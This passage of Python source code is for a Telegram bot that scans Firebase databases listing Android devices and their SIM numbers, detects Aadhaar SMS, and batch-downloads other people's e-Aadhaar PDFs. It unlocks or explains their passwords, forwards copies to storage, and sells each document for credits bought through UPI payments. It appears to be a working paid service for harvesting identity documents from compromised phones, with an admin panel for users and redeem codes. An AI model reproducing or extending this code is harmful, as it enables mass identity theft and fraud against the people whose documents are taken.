                f"<i>⏳  Background multi-processing running…</i>"
            )
            edit_message_text(chat_id, progress_msg_id, dash_text)

        def worker_task(dev_info, task_idx):
            nonlocal completed_count, failed_count
            sess = get_session(chat_id)
            if sess.get('step') != 'downloading':
                with lock:
                    completed_count += 1
                return

            if not (is_admin(chat_id) or has_credits(chat_id)):
                with lock:
                    failed_count += 1
                    completed_count += 1
                return

            mob = dev_info.get('mobile')
            dev_id = dev_info.get('dev_id')
            if not mob:
                with lock:
                    failed_count += 1
                    completed_count += 1
                return

            logger.info(f"[Batch Task {task_idx}] Processing mobile: {mob}, dev_id: {dev_id}")
            ok, res_data = _execute_single_firebase_download(
                chat_id, mob, fb_url, dev_id=dev_id, is_batch=True
            )

            with lock:
                completed_count += 1
                if ok and res_data and res_data.get('pdf_path'):
                    ready_pdfs.append(res_data)
                else:
                    failed_count += 1
                update_dashboard()

        # Run multi-threaded background pool
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(worker_task, dev, i) for i, dev in enumerate(devices, start=1)]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    logger.error(f"Error in batch future: {e}", exc_info=True)

        # Final dashboard update
        if progress_msg_id:
            final_dash = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>✅ ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴇxᴛʀᴀᴄᴛɪᴏɴ ғɪɴɪsʜᴇᴅ!</b>\n\n"
                f"📊  <b>ᴛᴏᴛᴀʟ ᴘʀᴏᴄᴇssᴇᴅ:</b> <b>{total}</b>\n"
                f"✅  <b>ᴘᴅғs ᴇxᴛʀᴀᴄᴛᴇᴅ:</b> <b>{len(ready_pdfs)}</b>\n"
                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n\n"
                f"<i>📤  ᴅᴇʟɪᴠᴇʀɪɴɢ ᴀʟʟ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs ʙᴇʟᴏᴡ…</i>"
            )
            edit_message_text(chat_id, progress_msg_id, final_dash)

        # DELIVER ALL EXTRACTED PDFS!
        if ready_pdfs:
            for item in ready_pdfs:
                p_path = item.get('pdf_path')
                p_name = item.get('name') or "Aadhaar Holder"
                p_pass = item.get('password')
                p_unlocked = item.get('is_unlocked', False)

                if p_path and os.path.exists(p_path):
                    if p_unlocked and p_pass:
                        caption = (
                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                            f"<b>✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ (ᴜɴʟᴏᴄᴋᴇᴅ)</b>\n\n"
                            f"👤  <b>ɴᴀᴍᴇ</b>      ·  <b>{html.escape(p_name)}</b>\n"
                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>    ·  e-Aadhaar PDF\n"
                            f"🔓  <b>ᴘᴀssᴡᴏʀᴅ</b>  ·  <code>{p_pass}</code>\n"
                            f"{DIVIDER}"
                        )
                    else:
                        caption = (
                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                            f"<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>\n\n"
                            f"👤  <b>ɴᴀᴍᴇ</b>    ·  {html.escape(p_name)}\n"
                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>  ·  e-Aadhaar PDF\n"
                            f"🔒  <b>sᴛᴀᴛᴜs</b>  ·  Password Protected\n"
                            f"{DIVIDER}\n\n"
                            f"<i>🔑  ᴘᴀssᴡᴏʀᴅ: First 4 letters of name in CAPITAL + Birth Year</i>"
                        )
                    clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', p_name)[:20]
                    send_document(chat_id, p_path, caption=caption, filename=f"Aadhaar_{clean_fn}.pdf")
                    forward_pdf_to_storage(chat_id, p_path, p_name, password=p_pass, method="firebase_batch")
                    database.record_pdf_download(str(chat_id), p_name, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="firebase_batch", password=p_pass)
                    try:
                        os.remove(p_path)
                    except Exception:
                        pass
                    time.sleep(0.5)

            # Deduct credits for delivered PDFs
            for _ in ready_pdfs:
                deduct_credit(chat_id)

        clear_session(chat_id)
        cr = get_credits(chat_id)
        cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🎉 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n"
            f"✅  <b>ᴛᴏᴛᴀʟ ᴘᴅғs ᴅᴇʟɪᴠᴇʀᴇᴅ:</b> <b>{len(ready_pdfs)} PDFs</b>\n"
            f"❌  <b>ғᴀɪʟᴇᴅ / ɴᴏ sᴍs:</b> <b>{failed_count}</b>\n\n"
            f"💰  <b>ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs:</b> <b>{cr_display}</b>\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ғᴏʀ ᴀɴᴏᴛʜᴇʀ ᴅᴏᴡɴʟᴏᴀᴅ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
    except Exception as e:
        logger.error(f"Error in batch worker: {e}", exc_info=True)
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"❌ <b>Error in batch download:</b> {html.escape(str(e))}",
            reply_markup=get_welcome_inline_keyboard()
        )

def show_firebase_devices_menu(chat_id, page=0):
    s = get_session(chat_id)
    d = s.get('data', {})
    devices = d.get('devices', [])
    fb_url = d.get('fb_url', '')

    parsed = urlparse(fb_url)
    db_name = parsed.netloc.replace('.firebaseio.com', '') or 'Firebase'

    total_devs = len(devices)
    online_count = sum(1 for x in devices if x.get('is_online'))
    aadhaar_count = sum(1 for x in devices if x.get('has_aadhaar_sms'))

    per_page = 4
    total_pages = max(1, (total_devs + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    update_session_data(chat_id, 'page', page)

    start_idx = page * per_page
    page_devices = devices[start_idx:start_idx + per_page]

    lines = [
        f"<b>{BOT_NAME}</b>",
        f"{DIVIDER}",
        f"<b>🔥 ғɪʀᴇʙᴀsᴇ ᴅᴇᴠɪᴄᴇ &amp; ᴀᴀᴅʜᴀᴀʀ sᴄᴀɴɴᴇʀ</b>\n",
        f"🌐  <b>ᴅᴀᴛᴀʙᴀsᴇ:</b> <code>{db_name}</code>",
        f"🟢  <b>ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇs:</b> <b>{online_count} Active</b>",
        f"🪪  <b>ᴀᴀᴅʜᴀᴀʀ ᴅᴇᴛᴇᴄᴛᴇᴅ:</b> <b>{aadhaar_count} Found</b>",
        f"{DIVIDER}",
        f"<b>📋  ᴀᴄᴛɪᴠᴇ ᴀᴀᴅʜᴀᴀʀ ᴅᴇᴠɪᴄᴇs (ᴘᴀɢᴇ {page+1}/{total_pages}):</b>\n"
    ]

    for i, dev in enumerate(page_devices, start=start_idx + 1):
        mob = dev.get('mobile') or 'No SIM Number'
        model = dev.get('model') or 'Android Device'
        bat = f" · 🔋{dev['battery']}" if dev.get('battery') else ""
        on_icon = "🟢" if dev.get('is_online') else "⚪"

        aadhaar_info = ""
        if dev.get('aadhaar_masked'):
            aadhaar_info = f"\n   🪪  <b>ᴀᴀᴅʜᴀᴀʀ:</b> <code>{dev['aadhaar_masked']}</code>"
        elif dev.get('has_aadhaar_sms'):
            aadhaar_info = f"\n   🪪  <b>ᴀᴀᴅʜᴀᴀʀ:</b> <code>sᴍs ʟɪɴᴋᴇᴅ</code>"

        lines.append(f"{i}️⃣  {on_icon} <b>+91 {mob}</b>  ·  {model}{bat}{aadhaar_info}")

    lines.append(f"\n{DIVIDER}")
    lines.append(f"<i>💡 ᴋɪᴛɴᴇ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ ɴɪᴋᴀʟɴᴇ ʜᴀɪɴ? ɴᴇᴇᴄʜᴇ sᴇ ǫᴜᴀɴᴛɪᴛʏ ᴄʜᴜɴᴇɪɴ ʏᴀ ᴋɪsɪ ᴇᴋ ᴅᴇᴠɪᴄᴇ ᴋᴏ ᴛᴀᴘ ᴋᴀʀᴇɪɴ:</i>")

    msg_text = "\n".join(lines)

    kb_rows = []

    # Batch quantity buttons
    valid_mobs = [x for x in devices if x.get('mobile')]
    v_count = len(valid_mobs)

    batch_row = []
    if v_count >= 1:
        batch_row.append({'text': '1 ᴘᴅғ', 'callback_data': 'fb_batch_1', 'icon_custom_emoji_id': '5456140674028019486', 'style': 'primary'})
    if v_count >= 2:
        batch_row.append({'text': '2 ᴘᴅғs', 'callback_data': 'fb_batch_2', 'icon_custom_emoji_id': '5456140674028019486', 'style': 'primary'})
    if v_count >= 3:
        batch_row.append({'text': '3 ᴘᴅғs', 'callback_data': 'fb_batch_3', 'icon_custom_emoji_id': '5456140674028019486', 'style': 'primary'})
    if batch_row:
        kb_rows.append(batch_row)

    if v_count > 1:
        kb_rows.append([{'text': f'ᴀʟʟ ᴀᴀᴅʜᴀᴀʀs ({v_count} ᴘᴅғs)', 'callback_data': f'fb_batch_{v_count}', 'icon_custom_emoji_id': '5289722755871162900', 'style': 'success'}])

    # Individual device buttons for this page
    for i, dev in enumerate(page_devices, start=start_idx):
        mob = dev.get('mobile') or 'Unknown'
        model = (dev.get('model') or 'Device')[:15]
        mask = f" ({dev.get('aadhaar_masked')[-4:]})" if dev.get('aadhaar_masked') else ""
        btn_text = f"{mob}{mask} · {model}"
        kb_rows.append([{'text': btn_text, 'callback_data': f'fb_dev_{i}', 'icon_custom_emoji_id': '6201882038975341348', 'style': 'primary'}])

    # Pagination buttons
    nav_row = []
    if page > 0:
        nav_row.append({'text': '◀️ ᴘʀᴇᴠ', 'callback_data': f'fb_page_{page-1}', 'icon_custom_emoji_id': '6276030448862763508'})
    if total_pages > 1:
        nav_row.append({'text': f'ᴘᴀɢᴇ {page+1}/{total_pages}', 'callback_data': 'noop'})
    if page < total_pages - 1:
        nav_row.append({'text': 'ɴᴇxᴛ ▶️', 'callback_data': f'fb_page_{page+1}', 'icon_custom_emoji_id': '6204139486671019705'})
    if nav_row:
        kb_rows.append(nav_row)

    # Manual entry and Cancel
    kb_rows.append([
        {'text': 'ᴇɴᴛᴇʀ ᴄᴜsᴛᴏᴍ ᴍᴏʙɪʟᴇ', 'callback_data': 'fb_manual', 'icon_custom_emoji_id': '6201882038975341348', 'style': 'primary'},
        {'text': 'ᴄᴀɴᴄᴇʟ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6305324410744084248', 'style': 'danger'}
    ])

    send_message(chat_id, msg_text, reply_markup={'inline_keyboard': kb_rows})

# ============== ADMIN PANEL ==============
def show_admin_panel(chat_id):
    data           = all_users()
    total          = len(data)
    lifetime_count = sum(1 for u in data.values() if u.get('lifetime'))
    banned_count   = sum(1 for u in data.values() if u.get('banned'))
    total_credits  = sum(u.get('credits', 0) for u in data.values() if not u.get('lifetime'))
    status_fc      = "<b>ON</b>" if is_force_check_enabled() else "<b>OFF</b>"
    dl_stats       = database.get_download_stats()

    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ</b>\n\n"
        f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs   ·  <b>{total}</b>\n"
        f"♾️   ʟɪғᴇᴛɪᴍᴇ      ·  <b>{lifetime_count}</b>\n"
        f"🚫  ʙᴀɴɴᴇᴅ        ·  <b>{banned_count}</b>\n"
        f"💰  ᴄʀᴇᴅɪᴛs ᴘᴏᴏʟ  ·  <b>{total_credits}</b>\n"
        f"📢  ғᴏʀᴄᴇ ᴊᴏɪɴ    ·  {status_fc}\n\n"
        f"📥  <b>ᴅᴏᴡɴʟᴏᴀᴅs sᴛᴀᴛs:</b>\n"
        f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
        f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
        f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
        f"  📊  <b>ᴛᴏᴛᴀʟ ᴅʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
        f"{DIVIDER}\n"
        f"<i>🛠  sᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>",
        reply_markup=get_admin_keyboard()
    )

def handle_admin_command(chat_id, text):
    parts = text.strip().split(None, 2)
    if parts[0] == '/admin':
        show_admin_panel(chat_id)
        return True

    if parts[0] in ('/channel', '/channels'):
        show_admin_channel_menu(chat_id)
        return True

    if parts[0] == '/setchannel' and len(parts) >= 3:
        new_ch_id = parts[1].strip()
        new_ch_link = parts[2].strip()
        ok = database.set_channel_config(new_ch_id, new_ch_link)
        if ok:
            with _cm_lock:
                _channel_member_cache.clear()
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"✅ <b>ᴄʜᴀɴɴᴇʟ sᴜᴄᴄᴇssғᴜʟʟʏ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
                f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{new_ch_id}</code>\n"
                f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {new_ch_link}"
            )
            show_admin_channel_menu(chat_id)
        else:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error saving channel configuration.")
        return True

    if parts[0] == '/send' and len(parts) == 3:
        try:
            target_id = int(parts[1])
            amount    = int(parts[2])
            if amount == -1:
                add_credits(target_id, 0, make_lifetime=True)
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>✅ ɢʀᴀɴᴛᴇᴅ ʟɪғᴇᴛɪᴍᴇ ᴛᴏ <code>{target_id}</code></b>")
                send_message(target_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🎁 ɢʀᴀɴᴛᴇᴅ ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ!</b>", reply_markup=get_welcome_inline_keyboard())
            else:
                add_credits(target_id, amount)
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>✅ sᴇɴᴛ {amount} ᴄʀᴇᴅɪᴛs ᴛᴏ <code>{target_id}</code></b>")
                send_message(target_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🎁 ʀᴇᴄᴇɪᴠᴇᴅ +{amount} ᴄʀᴇᴅɪᴛs!</b>", reply_markup=get_welcome_inline_keyboard())
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /send USERID AMOUNT (-1 for lifetime)")
        return True

    if parts[0] == '/stats':
        data = all_users()
        total = len(data)
        lifetime_count = sum(1 for u in data.values() if u.get('lifetime'))
        banned_count   = sum(1 for u in data.values() if u.get('banned'))
        total_credits  = sum(u.get('credits', 0) for u in data.values() if not u.get('lifetime'))
        channel_joins  = database.get_channel_verified_count()
        invite_link    = get_channel_invite_url()
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📊 sᴛᴀᴛɪsᴛɪᴄs</b>\n\n"
            f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs      —  <b>{total}</b>\n"
            f"📢  ᴄʜᴀɴɴᴇʟ ᴊᴏɪɴs    —  <b>{channel_joins}</b>\n"
            f"♾️   ʟɪғᴇᴛɪᴍᴇ         —  <b>{lifetime_count}</b>\n"
            f"🚫  ʙᴀɴɴᴇᴅ           —  <b>{banned_count}</b>\n"
            f"💰  ᴄʀᴇᴅɪᴛs ᴘᴏᴏʟ     —  <b>{total_credits}</b>\n\n"
            f"🔗  <b>ʙᴏᴛ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n<code>{invite_link}</code>\n"
            f"{DIVIDER}"
        )
        return True

    if parts[0] == '/balance' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            cr  = get_credits(uid)
            cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🆔 <code>{uid}</code>\n💰 ʙᴀʟᴀɴᴄᴇ: <b>{cr_display}</b>")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /balance USERID")
        return True

    if parts[0] == '/ban' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            ban_user(uid)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🚫 ᴜsᴇʀ <code>{uid}</code> ʙᴀɴɴᴇᴅ.")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /ban USERID")
        return True

    if parts[0] == '/unban' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            unban_user(uid)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ ᴜsᴇʀ <code>{uid}</code> ᴜɴʙᴀɴɴᴇᴅ.")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /unban USERID")
        return True

    if parts[0] == '/userinfo' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            u   = get_user(uid)
            if not u:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ User <code>{uid}</code> not found.")
            else:
                cr = get_credits(uid)
                cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
                banned_str = "🚫 Yes" if u.get('banned') else "✅ No"
                fn = (u.get('first_name') or '').strip()
                ln = (u.get('last_name') or '').strip()
                full_name = f"{fn} {ln}".strip() or "N/A"
                username = u.get('username')
                uname_str = f"@{username}" if username else "N/A"
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"🆔  <b>ɪᴅ</b>        —  <code>{uid}</code>\n"
                    f"👤  <b>ɴᴀᴍᴇ</b>      —  <b>{full_name}</b>\n"
                    f"🔗  <b>ᴜsᴇʀɴᴀᴍᴇ</b>  —  <b>{uname_str}</b>\n"
                    f"💰  <b>ᴄʀᴇᴅɪᴛs</b>   —  <b>{cr_display}</b>\n"
                    f"👥  <b>ʀᴇғᴇʀʀᴀʟs</b> —  <b>{u.get('referral_count', 0)}</b>\n"
                    f"🚫  <b>ʙᴀɴɴᴇᴅ</b>    —  {banned_str}\n\n"
                    f"{DIVIDER}"
                )
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /userinfo USERID")
        return True

    if parts[0] in ('/gencode', '/createcode', '/addcode') and len(parts) >= 3:
        try:
            code = parts[1].strip().upper()
            credits_val = int(parts[2])
            max_uses = int(parts[3]) if len(parts) >= 4 else 1
            is_lt = (credits_val == -1)
            ok, res_msg = database.create_redeem_code(code, credits_val if not is_lt else 0, max_uses=max_uses, make_lifetime=is_lt, created_by=str(chat_id))
            if ok:
                val_txt = "♾️ Lifetime" if is_lt else f"+{credits_val} Credits"
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"✅ <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ ᴄʀᴇᴀᴛᴇᴅ!</b>\n\n"
                    f"🎁  <b>ᴄᴏᴅᴇ:</b> <code>{code}</code>\n"
                    f"💰  <b>ᴠᴀʟᴜᴇ:</b> <b>{val_txt}</b>\n"
                    f"👥  <b>ᴍᴀx ᴜsᴇs:</b> <b>{max_uses}</b>\n\n"
                    f"<i>Users can claim via the Redeem button or /redeem {code}</i>",
                    reply_markup=get_admin_keyboard()
                )
            else:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Failed to create code: {res_msg}")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /gencode CODE CREDITS [MAX_USES]")
        return True

    if parts[0] == '/broadcast' and len(parts) >= 2:
        msg_text = text.strip()[len('/broadcast'):].strip()
        data = all_users()
        sent = 0
        failed = 0
        broadcast_msg = f"<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ғʀᴏᴍ {BOT_NAME}</b>\n{DIVIDER}\n\n{msg_text}\n\n{DIVIDER}"
        for uid_str in data:
            try:
                uid_int = int(uid_str)
                if not data[uid_str].get('banned'):
                    res = send_message(uid_int, broadcast_msg)
                    if res and res.get('ok'):
                        sent += 1
                    else:
                        failed += 1
            except Exception:
                failed += 1
            time.sleep(0.05)
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴏɴᴇ: {sent} Sent, {failed} Failed.")
        return True

    return False

# ============== UPI PAYMENT WATCHER & VERIFIER ==============
def check_new_payment_for_session(amount: float, ignored_utr: Optional[str] = None) -> Tuple[bool, Optional[str], str]:
    """
    Checks if a valid, unredeemed payment has arrived for the specified amount.
    Returns (is_valid_new_payment, utr, display_status).
    """
    is_paid, pay_data = gateway.check_recent_payment(amount)
    if not is_paid or not pay_data:
        return False, None, "PENDING"
        
    utr = str(pay_data.get('utr', '')).strip()
    if not utr:
        return False, None, "PENDING"
        
    # If the UTR matches the ignored UTR (cached before session creation) or is already claimed:
    if (ignored_utr and utr == ignored_utr) or is_utr_claimed(utr):
        return False, utr, "PENDING"
        
    return True, utr, "SUCCESS"

def _auto_check_payment_worker(chat_id, plan_key, amount, qr_msg_id, session_token, ignored_utr, expires_at):
    logger.info(f"Payment auto-checker started for chat {chat_id}, plan {plan_key}, amount ₹{amount}")
    plan = PLANS.get(plan_key, PLANS['100'])
    poll_interval = 4
    
    while time.time() < expires_at:
        time.sleep(poll_interval)
        
        sess = get_session(chat_id)
        if sess.get('step') != 'awaiting_utr':
            return
        sess_data = sess.get('data', {})
        if sess_data.get('session_token') != session_token:
            return
            
        try:
            is_valid, utr, status = check_new_payment_for_session(amount, ignored_utr)
            if is_valid and utr:
                logger.info(f"Auto-detected payment for chat {chat_id}: UTR={utr}, Amount={amount}")
                success = record_successful_payment(chat_id, utr, amount, plan['credits'], plan['lifetime'])
                if success:
                    clear_session(chat_id)
                    # Auto-delete the checkout / QR code post!
                    if qr_msg_id:
                        delete_message(chat_id, qr_msg_id)
                        
                    cr = get_credits(chat_id)
                    cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ" if cr == float('inf') else f"{int(cr)} Credits"
                    
                    success_text = (
                        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                        f"<b>🎉 ᴘᴀʏᴍᴇɴᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ & ᴠᴇʀɪғɪᴇᴅ!</b>\n\n"
                        f"✅  <b>ᴠᴇʀɪғɪᴇᴅ ᴜᴛʀ</b>   ·  <code>{utr}</code>\n"
                        f"💵  <b>ᴀᴍᴏᴜɴᴛ ᴘᴀɪᴅ</b>    ·  <b>₹{amount}</b>\n"
                        f"🎁  <b>ᴄʀᴇᴅɪᴛs ᴀᴅᴅᴇᴅ</b>  ·  <b>+{plan['credits']} Credits</b>\n"
                        f"📊  <b>ᴀᴘɪ sᴛᴀᴛᴜs</b>     ·  <code>SUCCESS</code>\n\n"
                        f"{DIVIDER}\n"
                        f"💰  <b>ᴛᴏᴛᴀʟ ʙᴀʟᴀɴᴄᴇ</b>  ·  <b>{cr_display}</b>\n\n"
                        f"<i>🚀 ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴘʀᴏᴄᴇᴇᴅ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs!</i>"
                    )
                    sent_resp = send_message(chat_id, success_text, reply_markup=get_welcome_inline_keyboard())
                    sent_mid = sent_resp.get('result', {}).get('message_id') if (sent_resp and isinstance(sent_resp, dict)) else None
                    if sent_mid:
                        set_message_reaction(chat_id, message_id=sent_mid, emoji="🎉")
                    return
        except Exception as e:
            logger.error(f"Error in auto-check worker: {e}")
            
    # Check if session expired without payment
    sess = get_session(chat_id)
    if sess.get('step') == 'awaiting_utr' and sess.get('data', {}).get('session_token') == session_token:
        clear_session(chat_id)
        if qr_msg_id:
            delete_message(chat_id, qr_msg_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>⏰ ᴘᴀʏᴍᴇɴᴛ sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n\n"
            f"⚠️  ᴛʜᴇ 10-ᴍɪɴᴜᴛᴇ ᴄʜᴇᴄᴋᴏᴜᴛ ᴡɪɴᴅᴏᴡ ʜᴀs ᴇxᴘɪʀᴇᴅ.\n"
            f"💡  <i>ɪғ ʏᴏᴜ ᴀʟʀᴇᴀᴅʏ ᴘᴀɪᴅ, sɪᴍᴘʟʏ sᴇɴᴅ ʏᴏᴜʀ 12-ᴅɪɢɪᴛ ᴜᴛʀ ʜᴇʀᴇ ᴀᴛ ᴀɴʏ ᴛɪᴍᴇ!</i>",
            reply_markup=get_welcome_inline_keyboard()
        )

# ============== CALLBACK HANDLER ==============
def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info=None):
    # Answer immediately to stop the button loading spinner right away
    if not data.startswith('buy_'):
        answer_callback_query(callback_query_id)
    touch_session(chat_id)
    if user_info:
        ensure_user(
            chat_id,
            first_name=user_info.get('first_name'),
            last_name=user_info.get('last_name'),
            username=user_info.get('username')
        )

    if data == 'admin_toggle_force_check' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        cfg = database.get_channel_config()
        new_fc = not cfg.get("force_check", True)
        database.set_channel_config(cfg.get("channel_id"), cfg.get("channel_link"), force_check=new_fc)
        with _cm_lock:
            _channel_member_cache.clear()
        show_admin_panel(chat_id)
        return

    if data == 'claim_code':
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'awaiting_redeem_code')
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"🎁 <b>ʀᴇᴅᴇᴇᴍ ɢɪғᴛ / ᴘʀᴏᴍᴏ ᴄᴏᴅᴇ</b>\n\n"
            f"<i>👇  Apna redeem code enter karein (e.g. <code>FREE10</code>):</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == 'admin_create_code_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'awaiting_admin_create_code')
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"🎁 <b>ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ</b>\n\n"
            f"<i>Format: <code>CODE CREDITS [MAX_USES]</code>\n\n"
            f"Examples:\n"
            f"• <code>FREE5 5 10</code> (5 credits, 10 uses)\n"
            f"• <code>VIPPASS -1 1</code> (-1 for Lifetime VIP)</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == 'admin_codes_list' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        codes = database.list_recent_redeem_codes(15)
        if not codes:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\nℹ️ No active redeem codes found.", reply_markup=get_admin_keyboard())
            return
        lines = [f"<b>🎁 ʀᴇᴄᴇɴᴛ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs</b>\n{DIVIDER}"]
        for c in codes:
            cd = c.get('code')
            val = "♾️ Lifetime" if c.get('lifetime') else f"+{c.get('credits')} Credits"
            uses = f"{c.get('used_count', 0)}/{c.get('max_uses', 1)}"
            lines.append(f"• <code>{cd}</code> | <b>{val}</b> | Used: <b>{uses}</b>")
        lines.append(f"\n{DIVIDER}")
        send_message(chat_id, "\n".join(lines), reply_markup=get_admin_keyboard())
        return

    if data == 'admin_channel_menu' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        show_admin_channel_menu(chat_id)
        return

    if data == 'admin_change_channel_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_channel')
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"✏️ <b>ɴᴇᴡ ᴄʜᴀɴɴᴇʟ ɪᴅ ᴀᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ ʙʜᴇᴊᴏ:</b>\n\n"
            f"📋 <b>ғᴏʀᴍᴀᴛ:</b>\n<code>CHANNEL_ID INVITE_LINK</code>\n\n"
            f"<i>ᴇxᴀᴍᴘʟᴇ:</i>\n<code>-1002894475319 https://t.me/+Vq7Ha3AVq4JjNTNl</code>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == 'admin_back' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        show_admin_panel(chat_id)
        return

    if data in ('start', 'main_menu'):
        answer_callback_query(callback_query_id)
        clear_session(chat_id)
        remove_reply_keyboard(chat_id)
        cr = get_credits(chat_id)
        cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
        send_message(
            chat_id,
